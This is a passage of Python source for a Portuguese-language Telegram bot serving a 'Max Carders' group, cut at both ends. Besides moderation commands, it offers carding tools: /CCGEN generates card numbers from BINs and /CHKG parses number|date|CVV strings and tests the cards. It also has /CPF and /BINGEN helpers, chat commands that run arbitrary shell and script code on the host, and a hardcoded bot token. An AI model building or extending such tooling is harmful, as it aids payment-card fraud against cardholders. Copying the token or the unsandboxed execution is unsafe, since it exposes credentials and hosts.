			elif(tipo[0].upper() == "D"):
				mensagem = f"{mensagem}"
			else:
				mensagem = "<b>FORMATAÇÃO NÃO ENCONTRADA.</b>"	
				
			if("reply_to_message" in msg):
				bot.sendMessage("@MaxCarders", mensagem, "html", disable_web_page_preview = True, reply_to_message_id = msg["reply_to_message"]["message_id"])
			else:
				bot.sendMessage("@MaxCarders", mensagem, "html", disable_web_page_preview = True)
		elif(msg["text"].split()[0].upper() == "!TITULO" and msg["from"]["id"] in admins and msg["text"].split()[1] or msg["text"].split()[0].upper() == "!TITLE" and msg["from"]["id"] in admins and msg["text"].split()[1]):
			bot.setChatTitle(msg["chat"]["id"], msg["text"][len(msg["text"].split()[0])+1:])
		elif(msg["text"].split()[0].upper() == "!DELPERFIL" and msg["from"]["id"] in admins):
			bot.deleteChatPhoto(msg["chat"]["id"])
		elif((msg["text"].split()[0].upper() == "!PY" or msg["text"].split()[0].upper() == "!PY3") and msg["text"].split()[1] and msg["from"]["username"] in super):
			code_python = msg["text"][len(msg["text"].split()[0])+1:]
			out_py = open("saida.py", "w")
			out_py.write(code_python)
			out_py.close()
			py_resultado_out = subprocess.getstatusoutput("python saida.py")
			bot.sendMessage(msg["chat"]["id"], f"<b>RESULTADO:</b>\n\n<pre>{html.escape(py_resultado_out[1])}</pre>", "html", reply_to_message_id = msg["message_id"])
		elif(msg["text"].split()[0].upper() == "!PY2" and msg["text"].split()[1] and msg["from"]["username"] in super):
			code_python = msg["text"][len(msg["text"].split()[0])+1:]
			out_py = open("saida.py", "w")
			out_py.write(code_python.replace("TOKEN","1040502017:AAGRd6LurRoOaT2N-eLQNeCmsaisJx6_NKM"))
			out_py.close()
			py_resultado_out = subprocess.getstatusoutput("python2 saida.py")
			bot.sendMessage(msg["chat"]["id"], f"<b>RESULTADO:</b>\n\n<pre>{html.escape(py_resultado_out[1])}</pre>", "html", reply_to_message_id = msg["message_id"])
		elif(msg["text"].split()[0].upper() == "!ADMIN" and msg["text"].split()[1] and msg["from"]["username"] in super):
			code_admin = msg["text"][len(msg["text"].split()[0])+1:]
			out_admin = open("saida.sh", "w")
			out_admin.write(code_admin)
			out_admin.close()
			admin_resultado_out = subprocess.getstatusoutput("sh saida.sh")
			bot.sendMessage(msg["chat"]["id"], f"<b>RESULTADO:</b>\n\n<pre>{html.escape(admin_resultado_out[1])}</pre>", "html", reply_to_message_id = msg["message_id"])
		elif(msg["text"].split()[0].upper() == "!PERL" and msg["text"].split()[1] and msg["from"]["username"] in super):
			code_perl = msg["text"][len(msg["text"].split()[0])+1:]
			out_perl = open("saida.pl", "w")
			out_perl.write(code_perl)
			out_perl.close()
			perl_resultado_out = subprocess.getstatusoutput("perl saida.pl")
			bot.sendMessage(msg["chat"]["id"], f"<b>RESULTADO:</b>\n\n<pre>{html.escape(perl_resultado_out[1])}</pre>", "html", reply_to_message_id = msg["message_id"])
		elif(msg["text"].split()[0].upper() == "!RUBY" and msg["text"].split()[1] and msg["from"]["username"] in super or msg["text"].split()[0].upper() == "!RB" and msg["text"].split()[1] and msg["from"]["username"] in super):
			code_ruby = msg["text"][len(msg["text"].split()[0])+1:]
			out_ruby = open("saida.rb", "w")
			out_ruby.write(code_ruby)
			out_ruby.close()
			ruby_resultado_out = subprocess.getstatusoutput("ruby saida.rb")
			bot.sendMessage(msg["chat"]["id"], f"<b>RESULTADO:</b>\n\n<pre>{html.escape(ruby_resultado_out[1])}</pre>", "html", reply_to_message_id = msg["message_id"])
		elif(msg["text"].split()[0].upper() == "!OP" and msg["from"]["id"] in super):
			if(not msg["reply_to_message"]["from"]["id"] in super):
				membro_promovido = msg["reply_to_message"]["from"]["first_name"]
				membro_promovido_id = msg["reply_to_message"]["from"]["id"]
				bot.promoteChatMember(msg["chat"]["id"], membro_promovido_id, can_change_info=False, can_delete_messages=True, can_restrict_members=True, can_invite_users=True, can_pin_messages=True)
				bot.sendMessage(msg["chat"]["id"], f"<b>O USUÁRIO {membro_promovido} FOI PROMOVIDO A ADMINISTRADOR PELO ADMIN {html.escape(msg['from']['first_name'])}</b>", "html")
			else:
				bot.sendMessage(msg["chat"]["id"], f"<b>Não foi possível promover o usuario</b> <pre>{html.escape(msg['reply_to_message']['from']['first_name'])}</pre> <b>porque ele ja é admin.</b>", "html", reply_to_message_id = msg["message_id"])
		
		
		
		elif(msg["text"].split()[0].upper() == "!DEOP" and msg["from"]["id"] in super):
			membro_deop = msg["reply_to_message"]["from"]["first_name"]
			membro_deop_id = msg["reply_to_message"]["from"]["id"]
			bot.promoteChatMember(msg["chat"]["id"], membro_deop_id, can_change_info=False, can_delete_messages=False, can_restrict_members=False, can_invite_users=False, can_pin_messages=False)
			bot.sendMessage(msg["chat"]["id"], f"<b>O USUÁRIO {membro_deop} LEVOU DEMOTED DO ADMIN {html.escape(msg['from']['first_name'])}</b>", "html")
		
		
		
		
		
		
		elif(msg["text"].split()[0].upper() == "!DADOS" and msg["from"]["id"] in admins):
			try:
				usuario_id = msg["reply_to_message"]["from"]["id"]
				first_name = html.escape(bot.getChat(usuario_id)["first_name"])
				try:
					last_name = bot.getChat(usuario_id)["last_name"]
				except:
					last_name = "NENHUM"	
				username = bot.getChat(usuario_id)["username"]
				if(username == ""):
					username = "NENHUM"
				is_bot = bot.getChatMember(msg["chat"]["id"], usuario_id)['user']['is_bot']
				if(is_bot == False):
					is_bot = "NÃO"
				else:
					is_bot = "SIM"
				id = usuario_id
				try:
					linguagem = bot.getChatMember(msg["chat"]["id"], membros[usuario_chamado])['user']['language_code']
				except:
					linguagem = "pt-BR"
				group_type = msg["chat"]["type"]
				if(group_type == "supergroup"):
					group_type = "SUPER GRUPO"
				elif(group_type == "group"):
					group_type = "GRUPO NORMAL"
				else:
					group_type = "NÃO É GRUPO"
				dados = f"""<b>RESULTADOS:</b>	
			
<b>NOME:</b>
<pre>{first_name}</pre>
			
<b>SOBRENOME:</b>
<pre>{last_name}</pre>
			
<b>USUARIO:</b>
<pre>@{username}</pre>
			
<b>ID:</b>
<pre>{id}</pre>
			
<b>LINGUAGEM:</b>
<pre>{linguagem}</pre>
			
<b>É BOT?</b>
<pre>{is_bot}</pre>

<b>TÍTULO DO GRUPO:</b>
<pre>{msg["chat"]["title"]}</pre>

<b>LINK DO GRUPO:</b>
<pre>t.me/{msg["chat"]["username"]}</pre>

<b>USERNAME DO GRUPO:</b>
<pre>@{msg["chat"]["username"]}</pre>

<b>TIPO DE GRUPO:</b>
<pre>{group_type}</pre>"""
				bot.sendMessage(msg["chat"]["id"], dados, "html", reply_to_message_id = msg["message_id"])
			
		
			except:
		
				usuario_escolhido = msg["text"].split()[1]
				if(usuario_escolhido[0] == "@"):
					usuario_escolhido = usuario_escolhido[1:]
				usuario_id = membros[usuario_escolhido]
			
				first_name = bot.getChat(usuario_id)["first_name"]
				try:
					last_name = bot.getChat(usuario_id)["last_name"]
				except:
					last_name = "NENHUM"	
				try:
					username = bot.getChat(usuario_id)["username"]
				except:
					username = "NENHUM"
				if(username == ""):
					username = "NENHUM"
				is_bot = bot.getChatMember(msg["chat"]["id"], usuario_id)['user']['is_bot']
				if(is_bot == False):
					is_bot = "NÃO"
				else:
					is_bot = "SIM"
				id = usuario_id
				try:
					linguagem = bot.getChatMember(msg["chat"]["id"], membros[usuario_chamado])['user']['language_code']
				except:
					linguagem = "pt-BR"
				group_type = msg["chat"]["type"]
				if(group_type == "supergroup"):
					group_type = "SUPER GRUPO"
				elif(group_type == "group"):
					group_type = "GRUPO NORMAL"
				else:
					group_type = "NÃO É GRUPO"
				dados = f"""<b>RESULTADOS:</b>	
			
<b>NOME:</b>
<pre>{first_name}</pre>
			
<b>SOBRENOME:</b>
<pre>{last_name}</pre>
			
<b>USUARIO:</b>
<pre>@{username}</pre>
			
<b>ID:</b>
<pre>{id}</pre>
			
<b>LINGUAGEM:</b>
<pre>{linguagem}</pre>
			
<b>É BOT?</b>
<pre>{is_bot}</pre>

<b>TÍTULO DO GRUPO:</b>
<pre>{msg["chat"]["title"]}</pre>

<b>LINK DO GRUPO:</b>
<pre>t.me/{msg["chat"]["username"]}</pre>

<b>USERNAME DO GRUPO:</b>
<pre>@{msg["chat"]["username"]}</pre>

<b>TIPO DE GRUPO:</b>
<pre>{group_type}</pre>"""
				bot.sendMessage(msg["chat"]["id"], dados, "html", reply_to_message_id = msg["message_id"])

		elif(msg["text"].split()[0].upper() == "/THUMB" and msg["text"].split()[1]):
			url_thumb = msg["text"].split()[1]
			if(url_thumb.find("youtu.be") == 1):
				url_thumb = url_thumb[-10:]
			else:	
				url_thumb = url_thumb[-11:]
			hd = f"https://i.ytimg.com/vi/{url_thumb}/maxresdefault.jpg"
			hq = f"https://i.ytimg.com/vi/{url_thumb}/hqdefault.jpg"
			try:
				bot.sendPhoto(msg["chat"]["id"], hd, reply_to_message_id = msg["message_id"])
			except:
				bot.sendPhoto(msg["chat"]["id"], hq, reply_to_message_id = msg["message_id"])
		elif(msg["text"].split()[0].upper() == "!PHP" and msg["text"].split()[1] and msg["from"]["username"] in super):
			php_code = msg["text"][5:]
			if(php_code[0:2] == "<?"):
				pass
			else:
				php_code = f"<?php\n{php_code}\n?>"
		
			out_php = open("saida.php","w")
			out_php.write(php_code)
			out_php.close()
			php_resultado_out = subprocess.getstatusoutput("php saida.php")[1]
			bot.sendMessage(msg["chat"]["id"], f"<b>RESULTADO:</b>\n\n<pre>{html.escape(php_resultado_out)}</pre>", "html", reply_to_message_id = msg["message_id"])
		elif(msg["text"].split()[0].upper() == "!HTML" and msg["text"].split()[1] and msg["from"]["username"] in super):
			html_code = msg["text"][6:].replace("<","%3C").replace(">","%3E").replace(" ","%20")
			url_site = f"http://makerscriiptsbr.ml/testeapi.php?texto={html_code}"
			url_site_new = f"http://api.screenshotmachine.com/?key=6ab069&dimension=1280x720&url={url_site}&device=desktop"
			print(url_site_new)
			bot.sendPhoto(msg["chat"]["id"], url_site_new)
		elif(msg["text"].split()[0].upper() == "!JS" and msg["text"].split()[1] and msg["from"]["username"] or msg["text"].split()[0].upper() == "!JAVASCRIPT" and msg["text"].split()[1] and msg["from"]["username"] or msg["text"].split()[0].upper() == "!NODEJS" and msg["text"].split()[1] and msg["from"]["username"] in super):
			nodejs_code = msg["text"][len(msg["text"].split()[0])+1:]
			out_nodejs = open("saida.js", "w")
			out_nodejs.write(nodejs_code)
			out_nodejs.close()
			nodejs_resultado_out = subprocess.getstatusoutput("node saida.js")[1]
			erro = """/storage/emulated/0/saida.js:"""
			if(nodejs_resultado_out[0:29] == erro):
				nodejs_resultado_out = "DEU UM ERRO AÍ MEU CHAPA ;-;"
			bot.sendMessage(msg["chat"]["id"], f"<b>RESULTADO:</b>\n\n<pre>{html.escape(nodejs_resultado_out)}</pre>", "html", reply_to_message_id = msg["message_id"])
		elif(msg["text"].split()[0].upper() == "!BAN" and msg["from"]["id"] in admins):
			motivo = msg["text"][5:]
			usuario_kickado = msg["reply_to_message"]["from"]["id"]
			if(usuario_kickado != 684842099):
				try:
					bot.kickChatMember(msg["chat"]["id"], usuario_kickado, until_date = 1)
				except:
					bot.sendMessage(msg["chat"]["id"], f"<pre>{msg['from']['first_name']}</pre>, <b>Ocorreu um erro ao banir</b> <pre>{usuario_kickado}</pre>. Certifique-se de que a pessoa que você está banindo não é admin.</b>.", "html", reply_to_message_id = msg["message_id"])
			else:
				bot.sendMessage(msg["chat"]["id"], f"<pre>{msg['from']['first_name']}</pre>, <b>Você não pode me banir rsrs</b>", "html", reply_to_message_id = msg["message_id"])
			if(motivo != ""):
				bot.sendMessage(msg["chat"]["id"], f"<b>O USUÁRIO</b> <pre>@{usuario_banido}</pre> <b>FOI BANIDO DO GRUPO PELO ADMIN</b> <pre>@{msg['from']['username']}</pre>\n\n<b>PELO MOTIVO:</b>\n<pre>{motivo}</pre>.", "html", reply_to_message_id = msg["message_id"])
			else:
				bot.sendMessage(msg["chat"]["id"], f"<b>O USUÁRIO</b> <pre>@{usuario_banido}</pre> <b>FOI BANIDO DO GRUPO PELO ADMIN</b> <pre>@{msg['from']['username']}</pre>.", "html", reply_to_message_id = msg["message_id"])
		elif(msg["text"].split()[0].upper() == "!UNBAN" and msg["from"]["id"] in admins):
			try:
				usuario_desbanido = msg["reply_to_message"]["from"]["id"]
				bot.sendMessage(msg["chat"]["id"], f"<b>O USUÁRIO @{msg['reply_to_message']['from']['username']} FOI DESBANIDO PELO ADMIN @{msg['from']['username']}</b>", "html", reply_to_message_id = msg["message_id"])
			except:
				usuario_desbanido = msg["text"].split()[1]
				if(usuario_desbanido[0] == "@"):
					usuario_desbanido = usuario_desbanido[1::]
				usuario_desbanido = membros[usuario_desbanido]
				bot.sendMessage(msg["chat"]["id"], f"<b>O USUÁRIO @{msg['text'].split()[1]} FOI DESBANIDO PELO ADMIN @{msg['from']['username']}</b>", "html", reply_to_message_id = msg["message_id"])
			bot.unbanChatMember(msg["chat"]["id"], usuario_desbanido)
		elif(msg["text"].split()[0].upper() == "!DELMSG" and msg["from"]["id"] in admins):
			#bot.deleteMessage(msg["chat"]["id"], reply_to_message_id = msg["message_id"])
			 bot.deleteMessage((msg["chat"]["id"], msg['reply_to_message']['message_id']))
			 bot.deleteMessage((msg["chat"]["id"], msg['message_id']))
		elif(msg["text"] == "Yes" or msg["text"] == "No"):
			bot.deleteMessage((msg["chat"]["id"], msg['message_id']))
		elif((msg["text"].split()[0].upper() == "!KICK" and msg["from"]["id"] in admins) or (msg["text"].split()[0].upper() == "!KICKAR" and msg["from"]["id"] in admins) or (msg["text"].split()[0].upper() == "!CAPOTAR" and msg["from"]["id"] in admins) or (msg["text"].split()[0].upper() == "!CHUTAR" and msg["from"]["id"] in admins)):
			try:
				if(msg["reply_to_message"]["from"]["username"] != "MaxCardersBot"):
					usuario_desbanido = msg["reply_to_message"]["from"]["id"]
					motivo = msg["text"][len(msg["text"].split()[0]) + 1:]
					bot.unbanChatMember(msg["chat"]["id"], usuario_desbanido)
					if(motivo != ""):
						bot.sendMessage(msg["chat"]["id"], f"<b>O USUÁRIO:\n@{msg['reply_to_message']['from']['first_name']}\n\nFOI KICKADO PELO ADMIN @{msg['from']['username']} PELO MOTIVO:</b>\n\n<pre>{motivo}</pre>", "html", reply_to_message_id = msg["message_id"])
					else:
						bot.sendMessage(msg["chat"]["id"], f"<b>O USUÁRIO:\n@{msg['reply_to_message']['from']['first_name']}\n\nFOI KICKADO PELO ADMIN @{msg['from']['username']}</b>", "html", reply_to_message_id = msg["message_id"])
				else:
					bot.sendMessage(msg["chat"]["id"], '<b>UÉ VOCÊ NÃO PODE ME KICKAR ;-;</b>', "html", reply_to_message_id = msg["message_id"])
			except:
				bot.sendMessage(msg["chat"]["id"], f'<b>O USUÁRIO </b><a href="http://t.me/{msg["reply_to_message"]["from"]["username"]}">{msg["reply_to_message"]["from"]["first_name"]}</a> <b>NÃO PODE SER KICKADO PORQUE ELE É ADMIN OU NÃO ESTÁ MAIS NO GRUPO.</b>', "html", reply_to_message_id = msg["message_id"], disable_web_page_preview = True)
		elif(msg["text"].split()[0].upper() == "!VOTE" and msg["from"]["id"] in admins):
			keyboard = InlineKeyboardMarkup(
				inline_keyboard=[
					[InlineKeyboardButton(text='Banir', callback_data='banir')],
					[InlineKeyboardButton(text='Não banir', callback_data='nao_banir')]
				]
			)
			bot.sendMessage(msg["chat"]["id"], f'<b>O ADMIN:\n</b><pre>@{msg["from"]["username"]} </pre>\n\n<b>INICIOU UM VOTAMENTO PARA BANIR:\n</b><pre>@{msg["from"]["username"]}</pre><b>.\n\nVOCÊ SÓ TEM 15 SEGUNDOS PARA ESCOLHER SEU VOTO ABAIXO.</b>', "html", reply_to_message_id = msg["message_id"], reply_markup=keyboard)
		elif(msg["text"][0] == "!" and not msg["from"]["username"] in super):
			bot.sendMessage(msg["chat"]["id"], f'<b>VOCÊ NÃO TEM PERMISSÃO PARA REALIZAR ESSE COMANDO. ENTRE EM CONTATO COM O ADMIN</b> <a href="http://t.me/TioFlaviin">Dono</a>', "html", reply_to_message_id = msg["message_id"], disable_web_page_preview = True)
	except:
		pass
	
	
	
	
	
	
	
	
	
	
	
	
	#COMANDOS MEMBROS
	if(ativar == True):
		
		try:
			if(msg["text"].split()[0].upper() == "/START" and not msg["from"]["id"] in sessao):
				deram_start.append(msg['from']['id'])
				if(str(deram_start).count(str(msg['from']['id'])) != 1):
					bot.sendMessage(msg["from"]["id"], "<b>ENVIADO NOVAMENTE:\n\nOPA, BEM VINDO(A) AO MEU CHAT! AGORA EU ACEITAREI SEUS COMANDOS COM FACILIDADE!\n\nMÁS PARA ISSO VOCÊ TERÁ QUE ESTAR NO GRUPO </b><pre>MS CØMÜNÏTY 171</pre> <b>PARA MIM ACEITAR SEUS COMANDOS. OBS: ESCOLHA DO EDITOR.\n\nLINK DO GRUPO: </b>https://t.me/MSComunity171\n\n<b>NÃO ACEITAMOS SPAMMERS, CASO CONTRÁRIO SERÁ BANIDO PERMANENTEMENTE!</b>\n\n<b>REGRAS:</b>\n\n<i>1. É NECESSÁRIO TER USERNAME PARA ENTRAR NO GRUPO. CASO CONTRARIO SERÁ CHUTADO.\n\n2. NÃO É PERMITIDO GHOSTS(FANTASMAS, MEMBRO QUE ENTRA NO GRUPO MÁS NÃO DIZ NADA).\n\n3. PROIBIDO PORNOGRAFIA ou GORE.\n\n</i><b>É ISTO, SEJA UM MEMBRO ATIVO E QUE OBEDEÇA AS REGRAS PARA NÃO SER BANIDO OU CHUTADO.</b>", "html", reply_to_message_id = msg["message_id"])
				else:
					bot.sendMessage(msg["from"]["id"], "<b>OPA, BEM VINDO(A) AO MEU CHAT! AGORA EU ACEITAREI SEUS COMANDOS COM FACILIDADE!\n\nMÁS PARA ISSO VOCÊ TERÁ QUE ESTAR NO GRUPO </b><pre>Max Carders</pre> <b>PARA MIM ACEITAR SEUS COMANDOS. OBS: ESCOLHA DO EDITOR.\n\nLINK DO GRUPO: </b>https://t.me/MaxCarders\n\n<b>NÃO ACEITAMOS SPAMMERS, CASO CONTRÁRIO SERÁ BANIDO PERMANENTEMENTE!\n\n</b><b>REGRAS:</b>\n\n<i>1. É NECESSÁRIO TER USERNAME PARA ENTRAR NO GRUPO. CASO CONTRARIO SERÁ CHUTADO.\n\n2. NÃO É PERMITIDO GHOSTS(FANTASMAS, MEMBRO QUE ENTRA NO GRUPO MÁS NÃO DIZ NADA).\n\n3. PROIBIDO PORNOGRAFIA ou GORE.\n\n</i><b>É ISTO, SEJA UM MEMBRO ATIVO E QUE OBEDEÇA AS REGRAS PARA NÃO SER BANIDO OU CHUTADO.</b>", "html", reply_to_message_id = msg["message_id"])
			elif(msg["text"].split()[0].upper() == "/START" and msg["from"]["id"] in sessao):
				if(str(deram_start).count(str(msg['from']['id'])) != 1):
					bot.sendMessage(msg["from"]["id"], "<b>ENVIADO NOVAMENTE:\n\nOPA, BEM VINDO(A) AO MEU CHAT! Sua sessão está ilimitada porque o bot ainda está em beta.</b>", "html", reply_to_message_id = msg["message_id"])
				else:
					bot.sendMessage(msg["from"]["id"], "<b>OPA, BEM VINDO(A) AO MEU CHAT! Sua sessão está ilimitada porque o bot ainda está em beta.</b>", "html", reply_to_message_id = msg["message_id"])
		except:
			pass
		if(msg["chat"]["type"] == "supergroup" or msg["from"]["id"] in sessao or msg["from"]["id"] in admins):
			try:
				#bot.sendMessage(msg["chat"]["id"], "TESTE")
				bot_response = choice(bot_interage)
				#global silenciar
				#if(msg["text"] == "!silenciar"):
				#silenciar = "sim"
				#bot.sendMessage(msg["chat"]["id"], "SILENCIADO.")
				#return True	
				#elif(silenciar == False):
				#bot.sendMessage(msg["chat"]["id"], "NA ESCOLIXO\n\nDE UM !silenciar PARA ESTA MENSAGEM NÃO APARECER MAIS.")
		
		
		
		
				#ITERAÇÃO DO BOT
				if(msg["text"].upper() in bot_interage):
					try:
						if(not msg["reply_to_message"]["from"]["id"] == 693860721):
							bot.sendMessage(msg["chat"]["id"], f"<b>{bot_response[0]}{bot_response[1:].lower()} {msg['from']['first_name']} ahuahsushshs</b>", "html", reply_to_message_id = msg["message_id"])
					except:
						pass
				
				
		
				#STATUS DOS COMANDOS
				elif(msg["text"].upper() == "/STATUS" or msg["text"].upper() == "/STATUS@MaxCardersBot"):
					bot.sendMessage(msg["chat"]["id"], comandos_online, "html", reply_to_message_id = msg["message_id"])
		
		
		
				#VER LISTA DE COMANDOS
				if(msg["text"].upper() == "/COMANDOS" or msg["text"].upper() == "/COMANDOS@MaxCardersBot"):
					keyboard = InlineKeyboardMarkup(
						inline_keyboard=[
							[InlineKeyboardButton(text='➡️ Próxima Página', callback_data='comandos_proximo')]
						]
					)
					bot.sendMessage(msg["chat"]["id"], comandos_pagina1,"html", reply_to_message_id = msg["message_id"], reply_markup=keyboard)
		
				elif(msg["text"].upper() == "/TRADUZ"):
					try:
						msg["reply_to_message"]
					except:
						bot.sendMessage(msg["chat"]["id"], help_traduz, "html", reply_to_message_id = msg["message_id"])
				elif(msg["text"].upper() == "/CCGEN" or msg["text"].upper() == "/CCGEN@MaxCardersBot"):
					bot.sendMessage(msg["chat"]["id"], help_ccgen, "html", reply_to_message_id = msg["message_id"])
#				elif(msg["text"].upper() == "/SKY" or msg["text"].upper() == "/SKY@MaxCardersBot"):
#					bot.sendMessage(msg["chat"]["id"], help_sky, "html", reply_to_message_id = msg["message_id"])"""
				elif(msg["text"].upper() == "/PASTE" or msg["text"].upper() == "/PASTE@MaxCardersBot"):
					bot.sendMessage(msg["chat"]["id"], help_paste, "html", reply_to_message_id = msg["message_id"])
				elif(msg["text"].upper() == "/ML" or msg["text"].upper() == "/ML@MaxCardersBot"):
					bot.sendMessage(msg["chat"]["id"], help_ml, "html", reply_to_message_id = msg["message_id"])
				elif(msg["text"].upper() == "/RT" and not "reply_to_message" in msg):
					bot.sendMessage(msg["chat"]["id"], help_rt, "html", reply_to_message_id = msg["message_id"])
				elif(msg["text"].upper() == "/NICKGEN" or msg["text"].upper() == "/NICKGEN@MaxCardersBot"):
					bot.sendMessage(msg["chat"]["id"], help_nickgen, "html", reply_to_message_id = msg["message_id"])
				elif(msg["text"].upper() == "/YOUTUBE" or msg["text"].upper() == "/YOUTUBE@MaxCardersBot"):
					bot.sendMessage(msg["chat"]["id"], help_youtube, "html", reply_to_message_id = msg["message_id"])
				elif(msg["text"].upper() == "/HASH" or msg["text"].upper() == "/HASH@MaxCardersBot"):
					bot.sendMessage(msg["chat"]["id"], help_hash, "html", reply_to_message_id = msg["message_id"])
				elif(msg["text"].upper() == "/BINGEN" or msg["text"].upper() == "/BINGEN@MaxCardersBot"):
					bot.sendMessage(msg["chat"]["id"], help_bingen, "html", reply_to_message_id = msg["message_id"])
				elif(msg["text"].upper() == "/NOME" or msg["text"].upper() == "/NOME@MaxCardersBot"):
					bot.sendMessage(msg["chat"]["id"], help_nome, "html", reply_to_message_id = msg["message_id"])
				elif(msg["text"].upper() == "/SSH" or msg["text"].upper() == "/SSH@MaxCardersBot"):
					bot.sendMessage(msg["chat"]["id"], help_ssh, "html", reply_to_message_id = msg["message_id"])
				elif(msg["text"].upper() == "/CEP" or msg["text"].upper() == "/CEP@MaxCardersBot"):
					bot.sendMessage(msg["chat"]["id"], help_cep, "html", reply_to_message_id = msg["message_id"])
				elif(msg["text"].upper() == "/EXTRAP" or msg["text"].upper() == "/EXTRAP@MaxCardersBot"):
					bot.sendMessage(msg["chat"]["id"], help_extrap, "html", reply_to_message_id = msg["message_id"])
				elif(msg["text"].upper() == "/CPF" or msg["text"].upper() == "/CPF@MaxCardersBot"):
					bot.sendMessage(msg["chat"]["id"], help_cpf, "html", reply_to_message_id = msg["message_id"])#
				elif(msg["text"].upper() == "/WIKI"):
					bot.sendMessage(msg["chat"]["id"], help_wiki, "html", reply_to_message_id = msg["message_id"])
				elif(msg["text"].upper() == "/ANIME"):
					bot.sendMessage(msg["chat"]["id"], help_anime, "html", reply_to_message_id = msg["message_id"])
				elif(msg["text"].upper() == "/CALC"):
					bot.sendMessage(msg["chat"]["id"], help_calc, "html", reply_to_message_id = msg["message_id"])
				elif(msg["text"].upper() == "/THUMB"):
					bot.sendMessage(msg["chat"]["id"], help_thumb, "html", reply_to_message_id = msg["message_id"])
				elif(msg["text"].upper() == "/MP3"):
					bot.sendMessage(msg["chat"]["id"], help_mp3, "html", reply_to_message_id = msg["message_id"])
				elif(msg["text"].upper() == "/FIGLET"):
					bot.sendMessage(msg["chat"]["id"], help_figlet, "html", reply_to_message_id = msg["message_id"])
				elif(msg["text"].upper() == "/CBGEN"):
					bot.sendMessage(msg["chat"]["id"], help_cbgen, "html", reply_to_message_id = msg["message_id"])
				elif(msg["text"].upper() == "/CELL"):
					bot.sendMessage(msg["chat"]["id"], help_cell, "html", reply_to_message_id = msg["message_id"])
				elif(msg["text"].upper() == "/PC"):
					bot.sendMessage(msg["chat"]["id"], help_pc, "html", reply_to_message_id = msg["message_id"])
				elif(msg["text"].upper() == "/TABLET"):
					bot.sendMessage(msg["chat"]["id"], help_tablet, "html", reply_to_message_id = msg["message_id"])
				elif(msg["text"].upper() == "/EMAILS"):
					bot.sendMessage(msg["chat"]["id"], help_emails, "html", reply_to_message_id = msg["message_id"])
				elif(msg["text"].upper() == "/SERIE"):
					bot.sendMessage(msg["chat"]["id"], help_serie, "html", reply_to_message_id = msg["message_id"])
				#elif(msg["text"].split()[0].upper() == "/PC" and msg["text"].split()[1]):
				#elif(msg["text"].split()[0].upper() == "/CELL" and msg["text"].split()[1]):
				#elif(msg["text"].split()[0].upper() == "/TABLET" and msg["text"].split()[1]):
				
				elif(msg["text"].upper().split()[0] == "/CCGEN" and msg["text"].upper().split()[1]):
					if(len(msg["text"].upper().split()) < 3):
						bot.sendMessage(msg["chat"]["id"], "<b>Sintaxe de comando incorreta. Dê um </b> /ccgen <b>para exibir os exemplos.</b>", "html", reply_to_message_id=msg["message_id"])
					else:
						try:
							quantidade = int(msg["text"].split()[2])
							if(quantidade > 0 and quantidade < 61):
								try:
									bin = msg["text"].upper().split()[1]
									if(ccgen(quantidade, bin)):
										bot.sendMessage(msg["chat"]["id"], f"<b>CC's Geradas:</b>\n\n<pre>{ccgen(quantidade, bin)}</pre>", "html", reply_to_message_id=msg["message_id"])
									else:
										bot.sendMessage(msg["chat"]["id"], f"<b>A bin deve conter 6 digitos.</b>", "html", reply_to_message_id=msg["message_id"])
								except:
									bot.sendMessage(msg["chat"]["id"], f"<b>Adicione na bin apenas números!</b>", "html", reply_to_message_id=msg["message_id"])
							else:
								bot.sendMessage(msg["chat"]["id"], f"<b>-> O limite é de 60 CC's para não ter flood.</b>", "html", reply_to_message_id=msg["message_id"])
						except NameError:
							bot.sendMessage(msg["chat"]["id"], "<b>Quantidade Inválida!</b>", "html", reply_to_message_id=msg["message_id"])
				elif(msg["text"].upper() == "/REGRA" or msg["text"].upper() == "/REGRAS" or msg["text"].upper() == "/REGRAS@MaxCardersBot"):
					regras = """<b>🔥➡️ Regras ⬅️🔥
					
➡️Não saia do grupo.</b>
<pre>⚠️Senão: Ban Permanente!!</pre>

<b>➡️Sem gore, pornografia ou coisas do gênero.</b>
<pre>⚠️Senão: Ban/Mute</pre>

<b>➡️Não é permitido divulgações de canais ou grupos.</b>
<pre>⚠️Senão: Ban</pre>

<b>➡️Sem flood.</b>
<pre>⚠️Senão: Kick/Ban/Mute</pre>
					
<b>➡️Evitar usar o botão de enviar a mensagem como uma quebra de linha para não ter muito flood.</b>
<pre>⚠️Senão: Ban/Kick/Mute</pre>
					
<b>➡️Respeitar os admins.</b>
<pre>⚠️Senão: Ban/Kick/Mute</pre>
		
<b>* E a regra mais importante:</b>
<pre>OBEDEÇA TODAS AS REGRAS HAUSHSU</pre>"""
					bot.sendMessage(msg["chat"]["id"], regras, "html", reply_to_message_id = msg["message_id"])
				elif(msg["text"].upper() == "/CHKG" or msg["text"].upper() == "CHKG@CHKVIADEBOT"):
					bot.sendMessage(msg["chat"]["id"], help_chkg, parse_mode="html", reply_to_message_id = msg["message_id"])
				elif(msg["text"].upper().split()[0] == "/CHKG" and msg["text"]):
					msg_bot = bot.sendMessage(msg["chat"]["id"], f"<b>✅ TESTANDO OS CARTÕES...</b>", parse_mode="html", reply_to_message_id = msg["message_id"])
					msgb = msg["text"]
					regex = r"\d{16}\|\d{2}\|\d{4}\|\d{3}"
					cc = re.compile(regex).findall(msgb)   
					dados = ""
					for x in cc:
						dados += f"""\n \n{cc2(x)}"""

					apaga_mensagem = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text='💣 Apagar Resultado', callback_data="delete")]])
					bot.editMessageText((msg["chat"]["id"], msg_bot["message_id"]), dados, parse_mode="html", reply_markup=apaga_mensagem)
					on_callback_query(apaga_mensagem)

				elif(msg["text"].upper() == "/REPORT"):
					if("reply_to_message" in msg):
						try:
							nome = msg["reply_to_message"]["from"]["first_name"] + " " + msg["reply_to_message"]["from"]["last_name"]
						except:
							nome = msg["reply_to_message"]["from"]["first_name"]
						
						quem = msg["from"]["first_name"]
						bot.sendMessage("@BRAZILREPORTS", f"<pre>{nome}</pre> <b>FOI REPORTADO POR</b> <pre>{quem}</pre>.", "html")
						bot.sendMessage(msg["chat"]["id"], f"<pre>{msg['from']['first_name']}</pre>, <b>Report enviado com sucesso!</b>", "html", reply_to_message_id = msg["message_id"])
					else:
						bot.sendMessage(msg["chat"]["id"], help_report, "html", reply_to_message_id = msg["message_id"])
				elif(msg["text"].split()[0].upper() == "/REPORT" and msg["text"].split()[1]):
					if("reply_to_message" in msg):
						try:
							nome = msg["reply_to_message"]["from"]["first_name"] + " " + msg["reply_to_message"]["from"]["last_name"]
						except:
							nome = msg["reply_to_message"]["from"]["first_name"]
						
						motivo = msg["text"][8:]
						quem = msg["from"]["first_name"]
